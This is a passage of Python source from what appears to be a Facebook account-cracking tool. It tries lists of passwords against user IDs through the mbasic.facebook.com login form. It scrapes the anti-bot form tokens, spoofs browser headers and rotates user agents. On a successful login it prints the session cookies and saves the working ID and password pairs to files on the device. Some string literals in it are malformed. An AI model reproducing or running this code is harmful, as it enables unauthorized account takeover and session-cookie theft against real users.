            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'no-cache, no-store, must-revalidate',
            "referer": 'https://p.free.facebook.com/',
            "sec-ch-ua": '"Google Chrome";v="107", "Not)A;Brand";v="24", "Chromium";v="107"',
            "sec-ch-ua-mobile": '?1',
            "sec-ch-ua-platform": "Android",
            "sec-fetch-dest": 'document',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-site": 'none',
            "sec-fetch-user": '?1',
            "upgrade-insecure-requests": '1',
            "user-agent": pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\\33[97;1m       [𝐎𝐊] '+uid+' | '+ps+'\3[0;92m')
                #print(f'\\3[1;92m       [🚀] Number : {uid}')
                
                print(f'\\33[1;92m [🚀] COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/yousuf-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\')
                break
            else:
                continue
        loop+=1        
    except:
        pass
def c(uid,pwx,tl):
    global loop
    global cps    
    global oks
    global agents
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\ \33[1;90m[\33[1;93m𝐘𝐎𝐔𝐒𝐔𝐅\33[1;90m] \33[1;96m%s/%s\33[1;90m \33[1;90m[\33[1;92mOK:%s\33[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            #oo=random.choice(sss)
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'm.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=1',
            'cache-control': 'no-cache, no-store, must-revalidate',
            "referer": 'https://m.free.facebook.com/',
            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
            "sec-ch-ua-mobile": '?0',
            "sec-ch-ua-platform": "Windows",
            "sec-fetch-dest": 'document',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-site": 'none',
            "sec-fetch-user": '?1',
            "upgrade-insecure-requests": '1',
            "user-agent": pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\\3[1;92m [𝐎𝐊] '+cid+' | '+ps+'\3[0;92m')
                #print(f'\\3[1;92m [🔢] Numer : {uid}')
                #print(f'\\33[1;92m [🍪] COOKIE : '+coki)
                cek_apk(session,coki)
                oks.append(cid)
                open('/sdcard/AHMED-ok.txt', 'a').write(cid+' | '+ps+'\')
                break
            else:
                continue
        loop+=1        
    except:
        pass
Main()
